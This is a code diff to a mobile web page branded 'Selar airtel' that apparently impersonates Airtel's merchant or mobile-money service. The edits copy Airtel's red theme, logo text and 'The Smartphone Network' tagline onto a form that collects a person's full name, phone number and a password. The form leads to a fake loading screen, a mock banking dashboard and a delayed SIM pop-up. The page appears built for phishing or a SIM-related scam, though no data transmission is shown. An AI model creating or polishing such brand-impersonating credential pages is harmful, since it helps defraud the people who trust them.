@@ -8,44 +8,49 @@
         :root { 
             --airtel-red: #ff0000; 
             --selar-blue: #002d5b; 
-            --deep-navy: #001529;
+            --deep-gray: #333333;
             --gold: #ffb400;
-            --bg: #f0f2f5; 
+            --white: #ffffff;
         }
         body { font-family: 'Segoe UI', sans-serif; background-color: #1a1a1a; margin: 0; padding: 0; display: flex; justify-content: center; }
         
         .mobile-container { width: 100%; max-width: 400px; background: white; min-height: 100vh; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; overflow-x: hidden; }
         .hidden { display: none !important; }
 
-        /* --- ATTRACTIVE LOGIN PAGE --- */
+        /* --- AIRTEL RED LOGIN THEME --- */
         #login-view { 
-            background: linear-gradient(180deg, var(--deep-navy) 0%, #003366 100%);
+            background: var(--airtel-red);
             min-height: 100vh;
             color: white;
+            display: flex;
+            flex-direction: column;
         }
         .intl-address-login { 
-            font-size: 0.6rem; color: rgba(255,255,255,0.7); text-align: right; padding: 15px; line-height: 1.4;
+            font-size: 0.65rem; color: rgba(255,255,255,0.9); text-align: right; padding: 15px; line-height: 1.4;
         }
-        .login-header { text-align: center; padding-top: 20px; }
+        .login-header { text-align: center; padding: 20px 0; }
+        .airtel-white-logo { font-size: 2.5rem; font-weight: 800; letter-spacing: -2px; }
+        
         .login-card { 
-            margin: 20px; background: rgba(255,255,255,0.05); 
-            padding: 25px; border-radius: 20px; backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.1);
+            margin: auto 20px 40px; background: white; 
+            padding: 30px 25px; border-radius: 25px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
         }
-        .login-card label { display: block; font-size: 0.7rem; font-weight: bold; margin-bottom: 5px; color: var(--gold); letter-spacing: 1px; }
+        .login-card label { display: block; font-size: 0.75rem; font-weight: 800; margin-bottom: 8px; color: var(--deep-gray); letter-spacing: 0.5px; }
         .login-card input { 
-            width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 12px; border: none;
-            background: rgba(255,255,255,0.9); color: #333; font-size: 0.95rem; box-sizing: border-box;
+            width: 100%; padding: 15px; margin-bottom: 20px; border-radius: 10px; border: 1px solid #ddd;
+            background: #f8f8f8; color: #333; font-size: 1rem; box-sizing: border-box; outline: none;
         }
+        .login-card input:focus { border-color: var(--airtel-red); }
         .btn-access { 
-            width: 100%; padding: 16px; background: var(--airtel-red); color: white; border: none;
-            border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 1rem;
-            box-shadow: 0 4px 15px rgba(255,0,0,0.3); transition: 0.3s;
+            width: 100%; padding: 18px; background: var(--airtel-red); color: white; border: none;
+            border-radius: 35px; font-weight: 900; cursor: pointer; font-size: 1.1rem;
+            box-shadow: 0 5px 15px rgba(255,0,0,0.3); transition: 0.3s;
         }
 
         /* --- LOADING SCREEN --- */
-        #loading-screen { position: absolute; inset: 0; background: var(--deep-navy); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; text-align: center; }
-        .spinner { width: 45px; height: 45px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--airtel-red); border-radius: 50%; animation: spin 1s linear infinite; }
+        #loading-screen { position: absolute; inset: 0; background: white; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--airtel-red); text-align: center; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--airtel-red); border-radius: 50%; animation: spin 1s linear infinite; }
 
         /* --- DASHBOARD --- */
         .dash-top { background: var(--selar-blue); color: white; padding: 25px 20px 40px; border-bottom-left-radius: 30px; border-bottom-right-radius: 30px; }
@@ -87,28 +92,29 @@
         </div>
         
         <div class="login-header">
-            <div class="selar-logo"><span style="color:white">Selar</span> <span style="color:var(--airtel-red)">airtel</span></div>
-            <p style="font-size: 0.7rem; color: var(--gold); letter-spacing: 2px; font-weight: bold;">PREMIUM MERCHANT PORTAL</p>
+            <div class="airtel-white-logo">airtel</div>
+            <div style="font-size: 0.7rem; color: white; letter-spacing: 2px; font-weight: bold; opacity: 0.9;">Selar Merchant Portal</div>
         </div>
 
         <div class="login-card">
             <label>FULL NAME</label>
-            <input type="text" id="m-name" placeholder="John Doe">
+            <input type="text" id="m-name" placeholder="Full Name of Merchant">
             
             <label>PHONE NUMBER</label>
-            <input type="text" id="m-phone" placeholder="07...">
+            <input type="text" id="m-phone" placeholder="Merchant Phone Number">
             
             <label>CREATE MERCHANT PASSWORD</label>
-            <input type="password" id="m-pin" placeholder="••••••••">
+            <input type="password" id="m-pin" placeholder="Enter Password">
             
             <button class="btn-access" onclick="handleLogin()">ACCESS DASHBOARD</button>
         </div>
+        <p style="text-align: center; font-size: 0.65rem; padding: 20px; opacity: 0.8;">The Smartphone Network</p>
     </div>
 
     <div id="loading-screen" class="hidden">
         <div class="spinner"></div>
-        <div style="font-size: 1.5rem; font-weight: 900; margin-top: 20px;">Selar airtel</div>
-        <p id="load-msg" style="font-size: 0.8rem; opacity: 0.7; padding: 0 40px; margin-top: 15px;"></p>
+        <div style="font-size: 1.5rem; font-weight: 900; margin-top: 20px; color: var(--selar-blue);">Selar airtel</div>
+        <p id="load-msg" style="font-size: 0.8rem; color: #666; padding: 0 40px; margin-top: 15px;"></p>
     </div>
 
     <div id="dashboard-view" class="hidden">
@@ -134,30 +140,12 @@
         </div>
 
         <div class="service-grid">
-            <div class="service-item">
-                <div class="icon-circle">🧾</div>
-                <div class="service-label">Pay Bills</div>
-            </div>
-            <div class="service-item">
-                <div class="icon-circle">🏧</div>
-                <div class="service-label">Withdrawal</div>
-            </div>
-            <div class="service-item">
-                <div class="icon-circle">💸</div>
-                <div class="service-label">Transfer</div>
-            </div>
-            <div class="service-item">
-                <div class="icon-circle">🌐</div>
-                <div class="service-label">Browser</div>
-            </div>
-            <div class="service-item">
-                <div class="icon-circle">🎁</div>
-                <div class="service-label">Special Offer</div>
-            </div>
-            <div class="service-item">
-                <div class="icon-circle">💱</div>
-                <div class="service-label">Exchange Rates</div>
-            </div>
+            <div class="service-item"><div class="icon-circle">🧾</div><div class="service-label">Pay Bills</div></div>
+            <div class="service-item"><div class="icon-circle">🏧</div><div class="service-label">Withdrawal</div></div>
+            <div class="service-item"><div class="icon-circle">💸</div><div class="service-label">Transfer</div></div>
+            <div class="service-item"><div class="icon-circle">🌐</div><div class="service-label">Browser</div></div>
+            <div class="service-item"><div class="icon-circle">🎁</div><div class="service-label">Special Offer</div></div>
+            <div class="service-item"><div class="icon-circle">💱</div><div class="service-label">Exchange Rates</div></div>
         </div>
 
         <div id="sim-popup" class="hidden">
@@ -186,7 +174,6 @@
 </div>
 
 <script>
-    // Local Storage Recovery
     window.onload = function() {
         const recovery = localStorage.getItem('selar_session');
         if (recovery) {
@@ -217,10 +204,8 @@
         document.getElementById('login-view').classList.add('hidden');
         document.getElementById('loading-screen').classList.add('hidden');
         document.getElementById('dashboard-view').classList.remove('hidden');
-        
         document.getElementById('dash-info').innerText = `${data.phone} - ${data.name.toUpperCase()}`;
         document.getElementById('notif-who').innerText = `${data.phone} and ${data.name}`;
-
         setTimeout(() => { document.getElementById('sim-popup').classList.remove('hidden'); }, 2000);
     }
 
